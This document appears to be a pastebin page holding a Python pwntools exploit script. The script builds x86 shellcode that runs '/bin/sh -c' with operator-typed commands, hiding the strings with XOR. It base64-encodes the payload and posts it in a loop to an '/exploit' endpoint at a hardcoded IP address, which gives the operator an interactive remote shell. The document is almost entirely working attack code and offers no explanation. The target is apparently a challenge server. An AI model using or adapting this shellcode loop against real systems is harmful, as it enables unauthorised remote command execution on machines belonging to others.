
Save New Duplicate & Edit Just Text Twitter
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
import sys
from pwn import *
from base64 import b64decode, b64encode
import requests
import json


payload_prologue="""
    mov     ebp, esp
    push 0x1010101
    xor dword ptr [esp], 0x169722e
    push 0x6e69622f
    push 0x1010101
    xor dword ptr [esp], 0x101622c
"""
payload_epilogue="""
    lea eax, [ebp-0x8]
    lea ebx, [ebp-0xc]
    mov ecx, esp
    push 0 
    push ecx
    push ebx
    push eax

    push 0xdeadbeef
    lea  eax, [esp+4]
    mov  [esp], eax
    mov  eax, 11
    mov  ebx, [esp+4]
    mov  ecx, [esp]
    mov  edx, 0

    push ecx
    push edx
    push ebp
    mov  ebp, esp
    sysenter
"""

URL = '178.128.100.75'
URL1 = 'http://{}/'.format(URL)
URL2 = 'http://{}/exploit'.format(URL)
while True:
    sys.stdout.write('$ ')
    sys.stdout.flush()
    payload_cmd = shellcraft.pushstr(raw_input())
    payload = payload_prologue + payload_cmd + payload_epilogue
    shellcode=asm(payload)
    data = {"payload": "{}".format( b64encode(shellcode) )}
    log.info('payload: {}'.format(b64encode(shellcode)))
    s = requests.session()
    r1 = s.get(URL1)
    r2 = s.post(URL2,data=json.dumps(data))